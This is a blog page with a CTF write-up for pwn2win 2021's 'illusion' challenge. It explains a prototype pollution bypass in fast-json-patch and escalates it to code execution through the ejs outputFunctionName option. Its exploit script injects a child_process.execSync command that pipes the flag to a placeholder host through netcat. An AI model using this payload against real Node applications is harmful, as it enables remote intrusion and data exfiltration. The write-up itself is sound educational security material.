<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>illusion - pwn2win 2021 | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="tl;dr  Using Prototype pollution vulnerablity in fast-json-patch pollute value in outputFunctionName  Get a shell as the flag can only be obtained using binary file">
<meta property="og:type" content="article">
<meta property="og:title" content="illusion - pwn2win 2021">
<meta property="og:url" content="http://example.com/2021/06/03/illusion-pwn2win2021/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="tl;dr  Using Prototype pollution vulnerablity in fast-json-patch pollute value in outputFunctionName  Get a shell as the flag can only be obtained using binary file">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2021-06-03T13:02:20.000Z">
<meta property="article:modified_time" content="2021-06-03T15:03:48.250Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="RCE">
<meta property="article:tag" content="Prototype pollution">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-illusion-pwn2win2021" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/06/03/illusion-pwn2win2021/" class="article-date">
  <time class="dt-published" datetime="2021-06-03T13:02:20.000Z" itemprop="datePublished">2021-06-03</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web-Exploitation/">Web Exploitation</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      illusion - pwn2win 2021
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><strong>tl;dr</strong></p>
<ul>
<li>Using Prototype pollution vulnerablity in fast-json-patch pollute value in outputFunctionName </li>
<li>Get a shell as the flag can only be obtained using binary file </li>
</ul>
<span id="more"></span>

<p><strong>No. Of Solves:</strong> 78</p>
<p><strong>Challenge points:</strong> 151</p>
<p><strong>Solved By:</strong> <a target="_blank" rel="noopener" href="https://twitter.com/_1nt3rc3pt0r_">1nt3rc3pt0r</a>, <a target="_blank" rel="noopener" href="https://twitter.com/captainkay11">Captain-Kay</a></p>
<h2 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h2><p>Laura just found a website used for monitoring security mechanisms on Rhizaâ€™s state and is planning to hack into it to forge the status of these security services. After that she will desactivate these security resources without alerting government agents. Your goal is to get into the server to change the monitoring service behavior.</p>
<p><strong>Source Code:</strong> <a href="source-code.zip">here</a></p>
<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>We have a list of service and status in <code>index.js</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">let services = &#123;</span><br><span class="line">    status: &quot;online&quot;,</span><br><span class="line">    cameras: &quot;online&quot;,</span><br><span class="line">    doors: &quot;online&quot;,</span><br><span class="line">    dome: &quot;online&quot;,</span><br><span class="line">    turrets: &quot;online&quot;</span><br><span class="line">   &#125;</span><br><span class="line">   app.use(&quot;/static&quot;, express.static(__dirname + &quot;/static&quot;));</span><br><span class="line">   app.get(&quot;/&quot;, async (req, res) =&gt; &#123;</span><br><span class="line">       const html = await ejs.renderFile(__dirname + &quot;/templates/index.ejs&quot;, &#123;services&#125;)</span><br><span class="line">       res.end(html)</span><br><span class="line">   &#125;)</span><br></pre></td></tr></table></figure>

<p>End point <code>/change_status</code> is used to update status of services ,this is done with help of package called <code>fast-json-patch</code>. </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">app.post(&quot;/change_status&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    console.log(&quot;changing status&quot;)</span><br><span class="line">    let patch = []</span><br><span class="line">    console.log(req.body);</span><br><span class="line">    Object.entries(req.body).forEach(([service, status]) =&gt; &#123;</span><br><span class="line"></span><br><span class="line">        if (service === &quot;status&quot;)&#123;</span><br><span class="line">            res.status(400).end(&quot;Cannot change all services status&quot;)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        patch.push(&#123;</span><br><span class="line">            &quot;op&quot;: &quot;replace&quot;,</span><br><span class="line">            &quot;path&quot;: &quot;/&quot; + service,</span><br><span class="line">            &quot;value&quot;: status</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>

<p><code>fast-json-patch</code> initially had vulnerablity regarding <em>Prototype pollution</em> and it was said to be fixed in the current version that we use in challenge.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (banPrototypeModifications &amp;&amp; key == &#x27;__proto__&#x27;) &#123;</span><br><span class="line">                throw new TypeError(&#x27;JSON-Patch: modifying `__proto__` prop is banned for security reasons, if this was on purpose, please set `banPrototypeModifications` flag false and pass it to this function. More info in fast-json-patch README&#x27;);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>Patch was not good enough to prevent Prototype pollution as they check for existance of <code>__proto__</code> there still exist a chance for Prototype pollution using <code>prototype</code> <a target="_blank" rel="noopener" href="https://github.com/Starcounter-Jack/JSON-Patch/pull/262">Check Here</a></p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Now we can overwrite values as we need  using <code>constructor/prototype/&lt;variable&gt;</code>.</p>
<h3 id="RCE-using-Prototype-pollution"><a href="#RCE-using-Prototype-pollution" class="headerlink" title="RCE using Prototype pollution"></a>RCE using Prototype pollution</h3><p>we have ejs as template engine and injecting code to <code>outputFunctionName</code> in <code>ejs.js</code> can lead to RCE <a target="_blank" rel="noopener" href="https://github.com/mde/ejs/issues/451">Check Here</a> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (opts.outputFunctionName) &#123;</span><br><span class="line">  prepended += &#x27;  var &#x27; + opts.outputFunctionName + &#x27; = __append;&#x27; + &#x27;\n&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Exploit-Script"><a href="#Exploit-Script" class="headerlink" title="Exploit Script"></a>Exploit Script</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">TARGET_URL = &#x27;http://illusion.pwn2win.party:23121&#x27;</span><br><span class="line">head=&#123;&quot;Authorization&quot;:&quot;Basic YWRtaW46cWpoeXFwZWJ4ZW12dnF1cg==&quot;&#125;// change</span><br><span class="line"></span><br><span class="line">r=requests.post(TARGET_URL + &#x27;/change_status&#x27;,json=&#123;&quot;constructor/prototype/outputFunctionName&quot;:&quot;a; return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;./readflag|nc &lt;ip&gt; &lt;port&gt;&#x27;); //&quot;&#125;,headers=head)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line">r=requests.get(TARGET_URL,headers=head)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF-BR&#123;d0nt_miX_pr0totyPe_pol1ution_w1th_a_t3mplat3_3ng1nE!&#125;</span><br></pre></td></tr></table></figure>








      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/06/03/illusion-pwn2win2021/" data-id="cksdght4p00001ocp2zmp6qoh" data-title="illusion - pwn2win 2021" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Prototype-pollution/" rel="tag">Prototype pollution</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2021/08/15/inCTFi21-JsonAnalyser/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          Json Analyser - InCTF Internationals 2021
        
      </div>
    </a>
  
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Web-Exploitation/">Web Exploitation</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/InCTFi/" rel="tag">InCTFi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Json-Interoperability/" rel="tag">Json_Interoperability</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Prototype-pollution/" rel="tag">Prototype pollution</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Prototype-Pollution/" rel="tag">Prototype_Pollution</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/InCTFi/" style="font-size: 10px;">InCTFi</a> <a href="/tags/Json-Interoperability/" style="font-size: 10px;">Json_Interoperability</a> <a href="/tags/Prototype-pollution/" style="font-size: 10px;">Prototype pollution</a> <a href="/tags/Prototype-Pollution/" style="font-size: 10px;">Prototype_Pollution</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/08/15/inCTFi21-JsonAnalyser/">Json Analyser - InCTF Internationals 2021</a>
          </li>
        
          <li>
            <a href="/2021/06/03/illusion-pwn2win2021/">illusion - pwn2win 2021</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>